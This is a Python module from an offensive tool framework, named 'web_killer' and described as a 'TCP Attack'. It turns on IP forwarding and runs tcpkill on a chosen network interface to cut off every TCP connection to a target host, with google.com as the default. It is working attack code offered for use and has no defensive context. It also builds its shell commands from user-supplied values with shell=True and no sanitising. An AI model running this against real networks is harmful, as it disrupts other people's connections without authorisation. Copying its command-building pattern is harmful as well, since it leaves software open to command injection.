#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

import time
import os
import subprocess
from core import colors
from collections import OrderedDict

conf = {
	"name": "web_killer",
	"version": "1.0",
	"shortdesc": "TCP Attack",
	"author": "4shadoww",
	"github": "4shadoww",
	"email":  "4shadoww0@gmail.com",
	"initdate": "24.2.2016"
}

# List of the variables
variables = OrderedDict((
	('interface', 'wlan0'),
	('target', 'google.com'),

))

# Description for variables
vdesc = [
	'network interface name',
	'target address',
]

# Simple changelog
changelog = "Version 1.0:\nrelease"



# Run
def run():
	variables['target'] = variables['target'].replace("http://", "")
	variables['target'] = variables['target'].replace("https://", "")
	print(colors.blue + "[*] IP Forwarding ..." + colors.end)
	subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	time.sleep(2)
	command_1 = 'tcpkill -i ' + variables['interface'] +' -9 host ' + variables['target']
	subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	line_3 = colors.green + "[*] Attack Has Been Started, For Stop Attack Press [enter] Key..." + colors.end
	press_ak = input(line_3)
	os.system('killall tcpkill')
	print(colors.bold + colors.blue + "[*] Attack Has Been Stoped." + colors.end)